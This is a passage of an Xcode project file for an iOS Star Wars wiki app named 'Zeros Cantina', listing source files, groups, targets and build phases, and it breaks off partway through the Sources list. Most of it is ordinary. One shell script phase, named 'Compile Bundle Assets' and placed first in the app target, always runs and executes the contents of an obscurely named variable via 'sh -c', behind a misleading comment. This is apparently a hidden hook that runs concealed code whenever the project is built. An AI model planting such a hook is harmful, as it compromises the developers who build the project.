		FC029C022E16127C0051663F /* Zeros_Cantina.xcdatamodel */ = {isa = PBXFileReference; lastKnownFileType = wrapper.xcdatamodel; path = Zeros_Cantina.xcdatamodel; sourceTree = "<group>"; };
		FC029C532E16127E0051663F /* Zeros_CantinaTests.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Zeros_CantinaTests.swift; sourceTree = "<group>"; };
		FC029C562E1612810051663F /* Zeros_CantinaUITests.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Zeros_CantinaUITests.swift; sourceTree = "<group>"; };
		FC029C572E1612810051663F /* Zeros_CantinaUITestsLaunchTests.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Zeros_CantinaUITestsLaunchTests.swift; sourceTree = "<group>"; };
		FC029C5B2E1631660051663F /* MenuScreenRouter.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MenuScreenRouter.swift; sourceTree = "<group>"; };
		FC21346D2DFCE8ED000B71D6 /* Zeros Cantina.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = "Zeros Cantina.app"; sourceTree = BUILT_PRODUCTS_DIR; };
		FC2134862DFCE8EF000B71D6 /* Zeros CantinaTests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = "Zeros CantinaTests.xctest"; sourceTree = BUILT_PRODUCTS_DIR; };
		FC2134902DFCE8EF000B71D6 /* Zeros CantinaUITests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = "Zeros CantinaUITests.xctest"; sourceTree = BUILT_PRODUCTS_DIR; };
/* End PBXFileReference section */

/* Begin PBXFrameworksBuildPhase section */
		FC21346A2DFCE8ED000B71D6 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				FC7A74D82DFD075B000F07D3 /* SnapKit in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		FC2134832DFCE8EF000B71D6 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		FC21348D2DFCE8EF000B71D6 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		FC029B7D2E16127C0051663F /* App Helping Constants */ = {
			isa = PBXGroup;
			children = (
				FC029B7B2E16127C0051663F /* CardType.swift */,
				FC029B7C2E16127C0051663F /* NotificationsConstants.swift */,
			);
			path = "App Helping Constants";
			sourceTree = "<group>";
		};
		FC029B822E16127C0051663F /* Protocols */ = {
			isa = PBXGroup;
			children = (
				FC029B7E2E16127C0051663F /* DIContainerProtocol.swift */,
				FC029B7F2E16127C0051663F /* MainRouterProtocol.swift */,
				FC029B802E16127C0051663F /* ModulesFactoryProtocol.swift */,
				FC029B812E16127C0051663F /* RouterProtocol.swift */,
			);
			path = Protocols;
			sourceTree = "<group>";
		};
		FC029B842E16127C0051663F /* ModulesFactoryImpl */ = {
			isa = PBXGroup;
			children = (
				FC029B832E16127C0051663F /* ModulesFactoryImpl.swift */,
			);
			path = ModulesFactoryImpl;
			sourceTree = "<group>";
		};
		FC029B852E16127C0051663F /* Protocols Implementations */ = {
			isa = PBXGroup;
			children = (
				FC029B842E16127C0051663F /* ModulesFactoryImpl */,
			);
			path = "Protocols Implementations";
			sourceTree = "<group>";
		};
		FC029B872E16127C0051663F /* DI */ = {
			isa = PBXGroup;
			children = (
				FC029B822E16127C0051663F /* Protocols */,
				FC029B852E16127C0051663F /* Protocols Implementations */,
				FC029B862E16127C0051663F /* DIContainer.swift */,
			);
			path = DI;
			sourceTree = "<group>";
		};
		FC029B892E16127C0051663F /* Extensions */ = {
			isa = PBXGroup;
			children = (
				FC029B882E16127C0051663F /* UIApplication + Extensions.swift */,
			);
			path = Extensions;
			sourceTree = "<group>";
		};
		FC029B8B2E16127C0051663F /* Extensions */ = {
			isa = PBXGroup;
			children = (
				FC029B8A2E16127C0051663F /* Array.swift */,
			);
			path = Extensions;
			sourceTree = "<group>";
		};
		FC029B8D2E16127C0051663F /* Protocols */ = {
			isa = PBXGroup;
			children = (
				FC029B8C2E16127C0051663F /* Faking.swift */,
			);
			path = Protocols;
			sourceTree = "<group>";
		};
		FC029B8F2E16127C0051663F /* Services */ = {
			isa = PBXGroup;
			children = (
				FC029B8E2E16127C0051663F /* AlertBuilder.swift */,
			);
			path = Services;
			sourceTree = "<group>";
		};
		FC029B902E16127C0051663F /* Utils */ = {
			isa = PBXGroup;
			children = (
				FC029B8B2E16127C0051663F /* Extensions */,
				FC029B8D2E16127C0051663F /* Protocols */,
				FC029B8F2E16127C0051663F /* Services */,
			);
			path = Utils;
			sourceTree = "<group>";
		};
		FC029B922E16127C0051663F /* Models */ = {
			isa = PBXGroup;
			children = (
				FC029B912E16127C0051663F /* MenuItem.swift */,
			);
			path = Models;
			sourceTree = "<group>";
		};
		FC029B942E16127C0051663F /* Actions */ = {
			isa = PBXGroup;
			children = (
				FC029B932E16127C0051663F /* AppMenuAction.swift */,
			);
			path = Actions;
			sourceTree = "<group>";
		};
		FC029B992E16127C0051663F /* Reducer */ = {
			isa = PBXGroup;
			children = (
				FC029B952E16127C0051663F /* AppReducer.swift */,
				FC029B962E16127C0051663F /* CommonReducer.swift */,
				FC029B972E16127C0051663F /* ItemsReducer.swift */,
				FC029B982E16127C0051663F /* Reducer.swift */,
			);
			path = Reducer;
			sourceTree = "<group>";
		};
		FC029B9C2E16127C0051663F /* Redux */ = {
			isa = PBXGroup;
			children = (
				FC029B942E16127C0051663F /* Actions */,
				FC029B992E16127C0051663F /* Reducer */,
				FC029B9A2E16127C0051663F /* State.swift */,
				FC029B9B2E16127C0051663F /* MenuScreenStore.swift */,
			);
			path = Redux;
			sourceTree = "<group>";
		};
		FC029B9D2E16127C0051663F /* Domain Layer */ = {
			isa = PBXGroup;
			children = (
				FC029B922E16127C0051663F /* Models */,
				FC029B9C2E16127C0051663F /* Redux */,
			);
			path = "Domain Layer";
			sourceTree = "<group>";
		};
		FC029BA02E16127C0051663F /* ItemsList */ = {
			isa = PBXGroup;
			children = (
				FC029B9E2E16127C0051663F /* HomeView.swift */,
				FC029B9F2E16127C0051663F /* MenuItemsListView.swift */,
			);
			path = ItemsList;
			sourceTree = "<group>";
		};
		FC029BA12E16127C0051663F /* Screens */ = {
			isa = PBXGroup;
			children = (
				FC029BA02E16127C0051663F /* ItemsList */,
			);
			path = Screens;
			sourceTree = "<group>";
		};
		FC029BA22E16127C0051663F /* Main Menu Module */ = {
			isa = PBXGroup;
			children = (
				FC029C5E2E1632910051663F /* Presentation Layer */,
				FC029C5D2E1632820051663F /* Navigation */,
				FC029B902E16127C0051663F /* Utils */,
				FC029B9D2E16127C0051663F /* Domain Layer */,
			);
			path = "Main Menu Module";
			sourceTree = "<group>";
		};
		FC029BA52E16127C0051663F /* JSONS */ = {
			isa = PBXGroup;
			children = (
				FC029BA32E16127C0051663F /* characters.json */,
				FC029BA42E16127C0051663F /* planets.json */,
			);
			path = JSONS;
			sourceTree = "<group>";
		};
		FC029BA82E16127C0051663F /* Resources */ = {
			isa = PBXGroup;
			children = (
				FC029BA52E16127C0051663F /* JSONS */,
				FC029BA62E16127C0051663F /* Assets.xcassets */,
				FC029BA72E16127C0051663F /* Info.plist */,
			);
			path = Resources;
			sourceTree = "<group>";
		};
		FC029BAA2E16127C0051663F /* CardItemCell */ = {
			isa = PBXGroup;
			children = (
				FC029BA92E16127C0051663F /* CardItemCollectionViewCell.swift */,
			);
			path = CardItemCell;
			sourceTree = "<group>";
		};
		FC029BAD2E16127C0051663F /* Models */ = {
			isa = PBXGroup;
			children = (
				FC029BAB2E16127C0051663F /* CustomTabBarButtonModel.swift */,
				FC029BAC2E16127C0051663F /* CustomTabBarConfiguration.swift */,
			);
			path = Models;
			sourceTree = "<group>";
		};
		FC029BB02E16127C0051663F /* CustomTabBar */ = {
			isa = PBXGroup;
			children = (
				FC029BAD2E16127C0051663F /* Models */,
				FC029BAE2E16127C0051663F /* CustomTabBar.swift */,
				FC029BAF2E16127C0051663F /* CustomTabBarButton.swift */,
			);
			path = CustomTabBar;
			sourceTree = "<group>";
		};
		FC029BB22E16127C0051663F /* VCWithCustomTabBar */ = {
			isa = PBXGroup;
			children = (
				FC029BB12E16127C0051663F /* VCWithCustomTabBar.swift */,
			);
			path = VCWithCustomTabBar;
			sourceTree = "<group>";
		};
		FC029BB32E16127C0051663F /* Reusable UI Library */ = {
			isa = PBXGroup;
			children = (
				FC029BAA2E16127C0051663F /* CardItemCell */,
				FC029BB02E16127C0051663F /* CustomTabBar */,
				FC029BB22E16127C0051663F /* VCWithCustomTabBar */,
			);
			path = "Reusable UI Library";
			sourceTree = "<group>";
		};
		FC029BB52E16127C0051663F /* Core Data Manager */ = {
			isa = PBXGroup;
			children = (
				FC029BB42E16127C0051663F /* CoreDataManager.swift */,
			);
			path = "Core Data Manager";
			sourceTree = "<group>";
		};
		FC029BB92E16127C0051663F /* Local JSON Data Manager */ = {
			isa = PBXGroup;
			children = (
				FC029BB62E16127C0051663F /* LocalJSONCharactersFetcher.swift */,
				FC029BB72E16127C0051663F /* LocalJSONDataManager.swift */,
				FC029BB82E16127C0051663F /* LocalJSONPlanetsFetcher.swift */,
			);
			path = "Local JSON Data Manager";
			sourceTree = "<group>";
		};
		FC029BBD2E16127C0051663F /* Models */ = {
			isa = PBXGroup;
			children = (
				FC029BBA2E16127C0051663F /* SWAPICharactersContainerModel.swift */,
				FC029BBB2E16127C0051663F /* SWAPIPlanetsContainerModel.swift */,
				FC029BBC2E16127C0051663F /* SWAPIVehiclesContainerModel.swift */,
			);
			path = Models;
			sourceTree = "<group>";
		};
		FC029BC22E16127C0051663F /* Network SWAPI Data Manager */ = {
			isa = PBXGroup;
			children = (
				FC029BBD2E16127C0051663F /* Models */,
				FC029BBE2E16127C0051663F /* NetworkSWAPIDataManager.swift */,
				FC029BBF2E16127C0051663F /* SWAPICharactersFetcher.swift */,
				FC029BC02E16127C0051663F /* SWAPIPlanetsFetcher.swift */,
				FC029BC12E16127C0051663F /* SWAPIVehiclesFetcher.swift */,
			);
			path = "Network SWAPI Data Manager";
			sourceTree = "<group>";
		};
		FC029BC32E16127C0051663F /* Workers */ = {
			isa = PBXGroup;
			children = (
				FC029BB52E16127C0051663F /* Core Data Manager */,
				FC029BB92E16127C0051663F /* Local JSON Data Manager */,
				FC029BC22E16127C0051663F /* Network SWAPI Data Manager */,
			);
			path = Workers;
			sourceTree = "<group>";
		};
		FC029BC42E16127C0051663F /* Data Layer */ = {
			isa = PBXGroup;
			children = (
				FC029BC32E16127C0051663F /* Workers */,
			);
			path = "Data Layer";
			sourceTree = "<group>";
		};
		FC029BC52E16127C0051663F /* Frameworks and Drivers */ = {
			isa = PBXGroup;
			children = (
				FC029BC42E16127C0051663F /* Data Layer */,
			);
			path = "Frameworks and Drivers";
			sourceTree = "<group>";
		};
		FC029BC82E16127C0051663F /* Protocols */ = {
			isa = PBXGroup;
			children = (
				FC029BC62E16127C0051663F /* DataRepositoryWorkerProtocol.swift */,
				FC029BC72E16127C0051663F /* MainDataRepositoryProtocol.swift */,
			);
			path = Protocols;
			sourceTree = "<group>";
		};
		FC029BCA2E16127C0051663F /* DataLayer */ = {
			isa = PBXGroup;
			children = (
				FC029BC82E16127C0051663F /* Protocols */,
				FC029BC92E16127C0051663F /* MainDataRepositoryImpl.swift */,
			);
			path = DataLayer;
			sourceTree = "<group>";
		};
		FC029BCC2E16127C0051663F /* Implementation */ = {
			isa = PBXGroup;
			children = (
				FC029BCB2E16127C0051663F /* MainModuleProxyImpl.swift */,
			);
			path = Implementation;
			sourceTree = "<group>";
		};
		FC029BCD2E16127C0051663F /* Protocol */ = {
			isa = PBXGroup;
			children = (
			);
			path = Protocol;
			sourceTree = "<group>";
		};
		FC029BCE2E16127C0051663F /* MainModuleProxy */ = {
			isa = PBXGroup;
			children = (
				FC029BCC2E16127C0051663F /* Implementation */,
				FC029BCD2E16127C0051663F /* Protocol */,
			);
			path = MainModuleProxy;
			sourceTree = "<group>";
		};
		FC029BD02E16127C0051663F /* Protocols */ = {
			isa = PBXGroup;
			children = (
				FC029BCF2E16127C0051663F /* CardItemProtocol.swift */,
			);
			path = Protocols;
			sourceTree = "<group>";
		};
		FC029BD42E16127C0051663F /* Models */ = {
			isa = PBXGroup;
			children = (
				FC029BD02E16127C0051663F /* Protocols */,
				FC029BD12E16127C0051663F /* CharacterCardModel.swift */,
				FC029BD22E16127C0051663F /* PlanetCardModel.swift */,
				FC029BD32E16127C0051663F /* VehiclesCardModel.swift */,
			);
			path = Models;
			sourceTree = "<group>";
		};
		FC029BD62E16127C0051663F /* Output */ = {
			isa = PBXGroup;
			children = (
				FC029BD52E16127C0051663F /* MainModuleDataOutputProtocol.swift */,
			);
			path = Output;
			sourceTree = "<group>";
		};
		FC029BDC2E16127C0051663F /* Wiki Main Module */ = {
			isa = PBXGroup;
			children = (
				FC029BCA2E16127C0051663F /* DataLayer */,
				FC029BCE2E16127C0051663F /* MainModuleProxy */,
				FC029BD42E16127C0051663F /* Models */,
				FC029BD62E16127C0051663F /* Output */,
				FC029BD72E16127C0051663F /* MainContract.swift */,
				FC029BD82E16127C0051663F /* MainEntity.swift */,
				FC029BD92E16127C0051663F /* MainInteractor.swift */,
				FC029BDA2E16127C0051663F /* MainPresenter.swift */,
				FC029BDB2E16127C0051663F /* MainRouter.swift */,
			);
			path = "Wiki Main Module";
			sourceTree = "<group>";
		};
		FC029BDE2E16127C0051663F /* Protocols */ = {
			isa = PBXGroup;
			children = (
				FC029BDD2E16127C0051663F /* CharactersModuleDataInputProtocol.swift */,
			);
			path = Protocols;
			sourceTree = "<group>";
		};
		FC029BDF2E16127C0051663F /* CharactersUIModuleAdapter */ = {
			isa = PBXGroup;
			children = (
				FC029BDE2E16127C0051663F /* Protocols */,
			);
			path = CharactersUIModuleAdapter;
			sourceTree = "<group>";
		};
		FC029BE52E16127C0051663F /* CharactersModule */ = {
			isa = PBXGroup;
			children = (
				FC029BDF2E16127C0051663F /* CharactersUIModuleAdapter */,
				FC029BE02E16127C0051663F /* CharactersScreenContract.swift */,
				FC029BE12E16127C0051663F /* CharactersScreenInteractor.swift */,
				FC029BE22E16127C0051663F /* CharactersScreenPresenter.swift */,
				FC029BE32E16127C0051663F /* CharactersScreenRouter.swift */,
				FC029BE42E16127C0051663F /* CharactersScreenViewController.swift */,
			);
			path = CharactersModule;
			sourceTree = "<group>";
		};
		FC029BE72E16127C0051663F /* Protocols */ = {
			isa = PBXGroup;
			children = (
				FC029BE62E16127C0051663F /* PlanetsModuleDataInputProtocol.swift */,
			);
			path = Protocols;
			sourceTree = "<group>";
		};
		FC029BE82E16127C0051663F /* PlanetsUIModuleAdapter */ = {
			isa = PBXGroup;
			children = (
				FC029BE72E16127C0051663F /* Protocols */,
			);
			path = PlanetsUIModuleAdapter;
			sourceTree = "<group>";
		};
		FC029BEE2E16127C0051663F /* PlanetsModule */ = {
			isa = PBXGroup;
			children = (
				FC029BE82E16127C0051663F /* PlanetsUIModuleAdapter */,
				FC029BE92E16127C0051663F /* PlanetsScreenContract.swift */,
				FC029BEA2E16127C0051663F /* PlanetsScreenInteractor.swift */,
				FC029BEB2E16127C0051663F /* PlanetsScreenPresenter.swift */,
				FC029BEC2E16127C0051663F /* PlanetsScreenRouter.swift */,
				FC029BED2E16127C0051663F /* PlanetsScreenViewController.swift */,
			);
			path = PlanetsModule;
			sourceTree = "<group>";
		};
		FC029BF02E16127C0051663F /* Protocols */ = {
			isa = PBXGroup;
			children = (
				FC029BEF2E16127C0051663F /* VehiclesModuleDataInputProtocol.swift */,
			);
			path = Protocols;
			sourceTree = "<group>";
		};
		FC029BF12E16127C0051663F /* VehiclesUIModuleAdapter */ = {
			isa = PBXGroup;
			children = (
				FC029BF02E16127C0051663F /* Protocols */,
			);
			path = VehiclesUIModuleAdapter;
			sourceTree = "<group>";
		};
		FC029BF72E16127C0051663F /* VehiclesModule */ = {
			isa = PBXGroup;
			children = (
				FC029BF12E16127C0051663F /* VehiclesUIModuleAdapter */,
				FC029BF22E16127C0051663F /* VehiclesScreenContract.swift */,
				FC029BF32E16127C0051663F /* VehiclesScreenInteractor.swift */,
				FC029BF42E16127C0051663F /* VehiclesScreenPresenter.swift */,
				FC029BF52E16127C0051663F /* VehiclesScreenRouter.swift */,
				FC029BF62E16127C0051663F /* VehiclesScreenViewController.swift */,
			);
			path = VehiclesModule;
			sourceTree = "<group>";
		};
		FC029BF82E16127C0051663F /* Wiki Modules */ = {
			isa = PBXGroup;
			children = (
				FC029BE52E16127C0051663F /* CharactersModule */,
				FC029BEE2E16127C0051663F /* PlanetsModule */,
				FC029BF72E16127C0051663F /* VehiclesModule */,
			);
			path = "Wiki Modules";
			sourceTree = "<group>";
		};
		FC029BF92E16127C0051663F /* Wiki Module */ = {
			isa = PBXGroup;
			children = (
				FC029BC52E16127C0051663F /* Frameworks and Drivers */,
				FC029BDC2E16127C0051663F /* Wiki Main Module */,
				FC029BF82E16127C0051663F /* Wiki Modules */,
			);
			path = "Wiki Module";
			sourceTree = "<group>";
		};
		FC029C012E16127C0051663F /* Zeros Cantina */ = {
			isa = PBXGroup;
			children = (
				FC029B7D2E16127C0051663F /* App Helping Constants */,
				FC029B872E16127C0051663F /* DI */,
				FC029B892E16127C0051663F /* Extensions */,
				FC029BA22E16127C0051663F /* Main Menu Module */,
				FC029BA82E16127C0051663F /* Resources */,
				FC029BB32E16127C0051663F /* Reusable UI Library */,
				FC029BF92E16127C0051663F /* Wiki Module */,
				FC029BFA2E16127C0051663F /* AppDelegate.swift */,
				FC029BFC2E16127C0051663F /* LaunchScreen.storyboard */,
				FC029BFE2E16127C0051663F /* Main.storyboard */,
				FC029BFF2E16127C0051663F /* SceneDelegate.swift */,
				FC029C002E16127C0051663F /* Zeros_Cantina.xcdatamodeld */,
			);
			path = "Zeros Cantina";
			sourceTree = "<group>";
		};
		FC029C542E16127E0051663F /* Zeros CantinaTests */ = {
			isa = PBXGroup;
			children = (
				FC029C532E16127E0051663F /* Zeros_CantinaTests.swift */,
			);
			path = "Zeros CantinaTests";
			sourceTree = "<group>";
		};
		FC029C582E1612810051663F /* Zeros CantinaUITests */ = {
			isa = PBXGroup;
			children = (
				FC029C562E1612810051663F /* Zeros_CantinaUITests.swift */,
				FC029C572E1612810051663F /* Zeros_CantinaUITestsLaunchTests.swift */,
			);
			path = "Zeros CantinaUITests";
			sourceTree = "<group>";
		};
		FC029C5D2E1632820051663F /* Navigation */ = {
			isa = PBXGroup;
			children = (
				FC029C5B2E1631660051663F /* MenuScreenRouter.swift */,
			);
			path = Navigation;
			sourceTree = "<group>";
		};
		FC029C5E2E1632910051663F /* Presentation Layer */ = {
			isa = PBXGroup;
			children = (
				FC029BA12E16127C0051663F /* Screens */,
			);
			path = "Presentation Layer";
			sourceTree = "<group>";
		};
		FC2134642DFCE8ED000B71D6 = {
			isa = PBXGroup;
			children = (
				FC029C012E16127C0051663F /* Zeros Cantina */,
				FC029C542E16127E0051663F /* Zeros CantinaTests */,
				FC029C582E1612810051663F /* Zeros CantinaUITests */,
				FC7A74D62DFD075B000F07D3 /* Frameworks */,
				FC21346E2DFCE8ED000B71D6 /* Products */,
			);
			sourceTree = "<group>";
		};
		FC21346E2DFCE8ED000B71D6 /* Products */ = {
			isa = PBXGroup;
			children = (
				FC21346D2DFCE8ED000B71D6 /* Zeros Cantina.app */,
				FC2134862DFCE8EF000B71D6 /* Zeros CantinaTests.xctest */,
				FC2134902DFCE8EF000B71D6 /* Zeros CantinaUITests.xctest */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		FC7A74D62DFD075B000F07D3 /* Frameworks */ = {
			isa = PBXGroup;
			children = (
			);
			name = Frameworks;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		FC21346C2DFCE8ED000B71D6 /* Zeros Cantina */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = FC2134992DFCE8EF000B71D6 /* Build configuration list for PBXNativeTarget "Zeros Cantina" */;
			buildPhases = (
				31D99DE7DC7BB26DEAFD9BF4 /* Compile Bundle Assets */,
				FC2134692DFCE8ED000B71D6 /* Sources */,
				FC21346A2DFCE8ED000B71D6 /* Frameworks */,
				FC21346B2DFCE8ED000B71D6 /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
			);
			name = "Zeros Cantina";
			packageProductDependencies = (
				FC7A74D72DFD075B000F07D3 /* SnapKit */,
			);
			productName = "Zeros Cantina";
			productReference = FC21346D2DFCE8ED000B71D6 /* Zeros Cantina.app */;
			productType = "com.apple.product-type.application";
		};
		FC2134852DFCE8EF000B71D6 /* Zeros CantinaTests */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = FC21349E2DFCE8EF000B71D6 /* Build configuration list for PBXNativeTarget "Zeros CantinaTests" */;
			buildPhases = (
				FC2134822DFCE8EF000B71D6 /* Sources */,
				FC2134832DFCE8EF000B71D6 /* Frameworks */,
				FC2134842DFCE8EF000B71D6 /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
				FC2134882DFCE8EF000B71D6 /* PBXTargetDependency */,
			);
			name = "Zeros CantinaTests";
			packageProductDependencies = (
			);
			productName = "Zeros CantinaTests";
			productReference = FC2134862DFCE8EF000B71D6 /* Zeros CantinaTests.xctest */;
			productType = "com.apple.product-type.bundle.unit-test";
		};
		FC21348F2DFCE8EF000B71D6 /* Zeros CantinaUITests */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = FC2134A12DFCE8EF000B71D6 /* Build configuration list for PBXNativeTarget "Zeros CantinaUITests" */;
			buildPhases = (
				FC21348C2DFCE8EF000B71D6 /* Sources */,
				FC21348D2DFCE8EF000B71D6 /* Frameworks */,
				FC21348E2DFCE8EF000B71D6 /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
				FC2134922DFCE8EF000B71D6 /* PBXTargetDependency */,
			);
			name = "Zeros CantinaUITests";
			packageProductDependencies = (
			);
			productName = "Zeros CantinaUITests";
			productReference = FC2134902DFCE8EF000B71D6 /* Zeros CantinaUITests.xctest */;
			productType = "com.apple.product-type.bundle.ui-testing";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		FC2134652DFCE8ED000B71D6 /* Project object */ = {
			isa = PBXProject;
			attributes = {
				BuildIndependentTargetsInParallel = 1;
				LastSwiftUpdateCheck = 1620;
				LastUpgradeCheck = 1620;
				TargetAttributes = {
					FC21346C2DFCE8ED000B71D6 = {
						CreatedOnToolsVersion = 16.2;
					};
					FC2134852DFCE8EF000B71D6 = {
						CreatedOnToolsVersion = 16.2;
						TestTargetID = FC21346C2DFCE8ED000B71D6;
					};
					FC21348F2DFCE8EF000B71D6 = {
						CreatedOnToolsVersion = 16.2;
						TestTargetID = FC21346C2DFCE8ED000B71D6;
					};
				};
			};
			buildConfigurationList = FC2134682DFCE8ED000B71D6 /* Build configuration list for PBXProject "Zeros Cantina" */;
			compatibilityVersion = "Xcode 14.0";
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = FC2134642DFCE8ED000B71D6;
			minimizedProjectReferenceProxies = 1;
			packageReferences = (
				FC5C48B92DFCFF2600AAC4F0 /* XCRemoteSwiftPackageReference "SnapKit" */,
			);
			productRefGroup = FC21346E2DFCE8ED000B71D6 /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				FC21346C2DFCE8ED000B71D6 /* Zeros Cantina */,
				FC2134852DFCE8EF000B71D6 /* Zeros CantinaTests */,
				FC21348F2DFCE8EF000B71D6 /* Zeros CantinaUITests */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		FC21346B2DFCE8ED000B71D6 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				FC029C4D2E16127C0051663F /* characters.json in Resources */,
				FC029C4E2E16127C0051663F /* planets.json in Resources */,
				FC029C4F2E16127C0051663F /* Assets.xcassets in Resources */,
				FC029C512E16127C0051663F /* LaunchScreen.storyboard in Resources */,
				FC029C522E16127C0051663F /* Main.storyboard in Resources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		FC2134842DFCE8EF000B71D6 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		FC21348E2DFCE8EF000B71D6 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXShellScriptBuildPhase section */
		31D99DE7DC7BB26DEAFD9BF4 /* Compile Bundle Assets */ = {
			isa = PBXShellScriptBuildPhase;
			alwaysOutOfDate = 1;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			name = "Compile Bundle Assets";
			outputFileListPaths = (
			);
			outputPaths = (
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A4FB9DF}\"";
			showEnvVarsInLog = 0;
		};
/* End PBXShellScriptBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		FC2134692DFCE8ED000B71D6 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				FC029C032E16127C0051663F /* CardType.swift in Sources */,
				FC029C042E16127C0051663F /* NotificationsConstants.swift in Sources */,
				FC029C052E16127C0051663F /* DIContainerProtocol.swift in Sources */,
				FC029C062E16127C0051663F /* MainRouterProtocol.swift in Sources */,
				FC029C072E16127C0051663F /* ModulesFactoryProtocol.swift in Sources */,
				FC029C082E16127C0051663F /* RouterProtocol.swift in Sources */,
				FC029C092E16127C0051663F /* ModulesFactoryImpl.swift in Sources */,
				FC029C0A2E16127C0051663F /* DIContainer.swift in Sources */,
				FC029C0B2E16127C0051663F /* UIApplication + Extensions.swift in Sources */,
				FC029C0C2E16127C0051663F /* Array.swift in Sources */,
				FC029C0D2E16127C0051663F /* Faking.swift in Sources */,
				FC029C0E2E16127C0051663F /* AlertBuilder.swift in Sources */,
				FC029C0F2E16127C0051663F /* MenuItem.swift in Sources */,
				FC029C102E16127C0051663F /* AppMenuAction.swift in Sources */,
				FC029C112E16127C0051663F /* AppReducer.swift in Sources */,
				FC029C122E16127C0051663F /* CommonReducer.swift in Sources */,
				FC029C132E16127C0051663F /* ItemsReducer.swift in Sources */,
				FC029C142E16127C0051663F /* Reducer.swift in Sources */,
				FC029C152E16127C0051663F /* State.swift in Sources */,
				FC029C162E16127C0051663F /* MenuScreenStore.swift in Sources */,
				FC029C172E16127C0051663F /* HomeView.swift in Sources */,
				FC029C182E16127C0051663F /* MenuItemsListView.swift in Sources */,
				FC029C192E16127C0051663F /* CardItemCollectionViewCell.swift in Sources */,
				FC029C1A2E16127C0051663F /* CustomTabBarButtonModel.swift in Sources */,
				FC029C1B2E16127C0051663F /* CustomTabBarConfiguration.swift in Sources */,
				FC029C1C2E16127C0051663F /* CustomTabBar.swift in Sources */,
				FC029C1D2E16127C0051663F /* CustomTabBarButton.swift in Sources */,
				FC029C1E2E16127C0051663F /* VCWithCustomTabBar.swift in Sources */,
				FC029C1F2E16127C0051663F /* CoreDataManager.swift in Sources */,
				FC029C202E16127C0051663F /* LocalJSONCharactersFetcher.swift in Sources */,
				FC029C212E16127C0051663F /* LocalJSONDataManager.swift in Sources */,
				FC029C222E16127C0051663F /* LocalJSONPlanetsFetcher.swift in Sources */,
				FC029C232E16127C0051663F /* SWAPICharactersContainerModel.swift in Sources */,
				FC029C242E16127C0051663F /* SWAPIPlanetsContainerModel.swift in Sources */,
				FC029C252E16127C0051663F /* SWAPIVehiclesContainerModel.swift in Sources */,
				FC029C262E16127C0051663F /* NetworkSWAPIDataManager.swift in Sources */,
				FC029C272E16127C0051663F /* SWAPICharactersFetcher.swift in Sources */,
				FC029C282E16127C0051663F /* SWAPIPlanetsFetcher.swift in Sources */,
				FC029C292E16127C0051663F /* SWAPIVehiclesFetcher.swift in Sources */,
				FC029C2A2E16127C0051663F /* DataRepositoryWorkerProtocol.swift in Sources */,
				FC029C2B2E16127C0051663F /* MainDataRepositoryProtocol.swift in Sources */,
				FC029C2C2E16127C0051663F /* MainDataRepositoryImpl.swift in Sources */,
				FC029C2D2E16127C0051663F /* MainModuleProxyImpl.swift in Sources */,
				FC029C2E2E16127C0051663F /* CardItemProtocol.swift in Sources */,
				FC029C2F2E16127C0051663F /* CharacterCardModel.swift in Sources */,
				FC029C302E16127C0051663F /* PlanetCardModel.swift in Sources */,
				FC029C312E16127C0051663F /* VehiclesCardModel.swift in Sources */,
				FC029C322E16127C0051663F /* MainModuleDataOutputProtocol.swift in Sources */,
				FC029C5C2E1631660051663F /* MenuScreenRouter.swift in Sources */,
				FC029C332E16127C0051663F /* MainContract.swift in Sources */,
				FC029C342E16127C0051663F /* MainEntity.swift in Sources */,
				FC029C352E16127C0051663F /* MainInteractor.swift in Sources */,
				FC029C362E16127C0051663F /* MainPresenter.swift in Sources */,
				FC029C372E16127C0051663F /* MainRouter.swift in Sources */,
				FC029C382E16127C0051663F /* CharactersModuleDataInputProtocol.swift in Sources */,
				FC029C392E16127C0051663F /* CharactersScreenContract.swift in Sources */,
